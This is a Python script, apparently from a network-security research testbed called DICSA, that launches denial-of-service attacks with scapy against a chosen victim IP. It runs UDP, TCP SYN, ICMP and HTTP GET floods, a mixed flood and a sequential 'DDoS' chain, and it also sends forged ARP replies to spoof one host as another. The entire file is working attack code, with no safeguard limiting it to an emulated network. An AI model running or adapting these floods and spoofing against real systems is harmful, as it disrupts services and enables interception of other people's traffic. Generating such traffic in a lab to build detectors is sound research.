#!/usr/bin/env python3
"""
Attack Launcher for DICSA Framework
Supports: UDP flood, TCP SYN flood, ICMP flood, HTTP GET flood,
Mixed flood (UDP+TCP), ARP spoof, and Sequential (all).
"""

import argparse
import time
import re
import os
import logging
from scapy.all import Ether, ARP, IP, UDP, TCP, ICMP, sendp, Raw, get_if_list

# ----------------------------
# Setup Attack Logger
# ----------------------------
log_dir = "experiments/results_logs"
os.makedirs(log_dir, exist_ok=True)
log_file = os.path.join(log_dir, "attacks.log")

logging.basicConfig(
    filename=log_file,
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
)
logger = logging.getLogger("AttackSimulator")


# ----------------------------
# Interface Auto-Detection
# ----------------------------
def auto_detect_iface(hostname):
    iface_list = get_if_list()
    pattern = re.compile(rf"^{hostname}-eth\d+$")
    for iface in iface_list:
        if pattern.match(iface):
            return iface
    raise ValueError(f"No interface found for host {hostname}")


# ----------------------------
# Attack Functions
# ----------------------------
def udp_flood(victim_ip, victim_port, iface, duration):
    pkt = Ether() / IP(dst=victim_ip) / UDP(dport=victim_port)
    logger.info(f"⚡ UDP flood: target={victim_ip}:{victim_port}, iface={iface}, duration={duration}s")
    print(f"⚡ UDP flood: target={victim_ip}:{victim_port}, iface={iface}")
    start = time.time()
    while time.time() - start < duration:
        sendp(pkt, iface=iface, verbose=False)
    logger.info(f"✅ UDP flood finished")


def tcp_syn_flood(victim_ip, victim_port, iface, duration):
    pkt = Ether() / IP(dst=victim_ip) / TCP(dport=victim_port, flags="S")
    logger.info(f"⚡ TCP SYN flood: target={victim_ip}:{victim_port}, iface={iface}, duration={duration}s")
    print(f"⚡ TCP SYN flood: target={victim_ip}:{victim_port}, iface={iface}")
    start = time.time()
    while time.time() - start < duration:
        sendp(pkt, iface=iface, verbose=False)
    logger.info(f"✅ TCP SYN flood finished")


def icmp_flood(victim_ip, iface, duration):
    pkt = Ether() / IP(dst=victim_ip) / ICMP()
    logger.info(f"⚡ ICMP flood: target={victim_ip}, iface={iface}, duration={duration}s")
    print(f"⚡ ICMP flood: target={victim_ip}, iface={iface}")
    start = time.time()
    while time.time() - start < duration:
        sendp(pkt, iface=iface, verbose=False)
    logger.info(f"✅ ICMP flood finished")


def http_flood(victim_ip, victim_port, iface, duration):
    http_payload = b"GET / HTTP/1.1\r\nHost: " + victim_ip.encode() + b"\r\n\r\n"
    pkt = Ether() / IP(dst=victim_ip) / TCP(dport=victim_port, flags="PA") / Raw(load=http_payload)
    logger.info(f"⚡ HTTP flood: target={victim_ip}:{victim_port}, iface={iface}, duration={duration}s")
    print(f"⚡ HTTP flood: target={victim_ip}:{victim_port}, iface={iface}")
    start = time.time()
    while time.time() - start < duration:
        sendp(pkt, iface=iface, verbose=False)
    logger.info(f"✅ HTTP flood finished")


def mixed_flood(victim_ip, victim_port, iface, duration):
    udp_pkt = Ether() / IP(dst=victim_ip) / UDP(dport=victim_port)
    tcp_pkt = Ether() / IP(dst=victim_ip) / TCP(dport=victim_port, flags="S")
    logger.info(f"⚡ Mixed flood (UDP+TCP): target={victim_ip}:{victim_port}, iface={iface}, duration={duration}s")
    print(f"⚡ Mixed flood (UDP+TCP): target={victim_ip}:{victim_port}, iface={iface}")
    start = time.time()
    while time.time() - start < duration:
        sendp(udp_pkt, iface=iface, verbose=False)
        sendp(tcp_pkt, iface=iface, verbose=False)
    logger.info(f"✅ Mixed flood finished")


def arp_spoof(victim_ip, target_ip, iface, duration):
    pkt = ARP(op=2, pdst=victim_ip, psrc=target_ip)
    logger.info(f"⚡ ARP spoof: victim={victim_ip}, target={target_ip}, iface={iface}, duration={duration}s")
    print(f"⚡ ARP spoof: victim={victim_ip}, target={target_ip}, iface={iface}")
    start = time.time()
    while time.time() - start < duration:
        sendp(pkt, iface=iface, verbose=False)
    logger.info(f"✅ ARP spoof finished")


def sequential_ddos(victim_ip, victim_port, iface, duration):
    logger.info("🚀 Sequential DDoS attack started (UDP → TCP SYN → ICMP → HTTP → Mixed)")
    udp_flood(victim_ip, victim_port, iface, duration)
    tcp_syn_flood(victim_ip, victim_port, iface, duration)
    icmp_flood(victim_ip, iface, duration)
    http_flood(victim_ip, victim_port, iface, duration)
    mixed_flood(victim_ip, victim_port, iface, duration)
    logger.info("✅ Sequential DDoS attack finished")


# ----------------------------
# Main
# ----------------------------
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ASDM Attack Simulator")
    parser.add_argument("--mode", type=str,
                        choices=["udp", "tcp", "icmp", "http", "mixed", "sequential", "arp", "list"],
                        required=True, help="Attack mode")
    parser.add_argument("--victim", type=str, help="Victim IP address")
    parser.add_argument("--target", type=str, help="Target IP for ARP spoofing")
    parser.add_argument("--iface", type=str, default=None, help="Network interface (auto if not set)")
    parser.add_argument("--host", type=str, default="h1", help="Attacker host name (default h1)")
    parser.add_argument("--port", type=int, default=80, help="Target port")
    parser.add_argument("--duration", type=int, default=10, help="Attack duration in seconds")

    args = parser.parse_args()

    iface = args.iface
    if iface is None and args.mode != "list":
        iface = auto_detect_iface(args.host)
        print(f"[INFO] Auto-detected interface for {args.host}: {iface}")

    if args.mode == "list":
        print("Available interfaces:")
        for i in get_if_list():
            print(f" - {i}")
    elif args.mode == "udp":
        udp_flood(args.victim, args.port, iface, args.duration)
    elif args.mode == "tcp":
        tcp_syn_flood(args.victim, args.port, iface, args.duration)
    elif args.mode == "icmp":
        icmp_flood(args.victim, iface, args.duration)
    elif args.mode == "http":
        http_flood(args.victim, args.port, iface, args.duration)
    elif args.mode == "mixed":
        mixed_flood(args.victim, args.port, iface, args.duration)
    elif args.mode == "sequential":
        sequential_ddos(args.victim, args.port, iface, args.duration)
    elif args.mode == "arp":
        if not args.victim or not args.target:
            print("❌ Victim and Target IP required for ARP spoofing.")
        else:
            arp_spoof(args.victim, args.target, iface, args.duration)
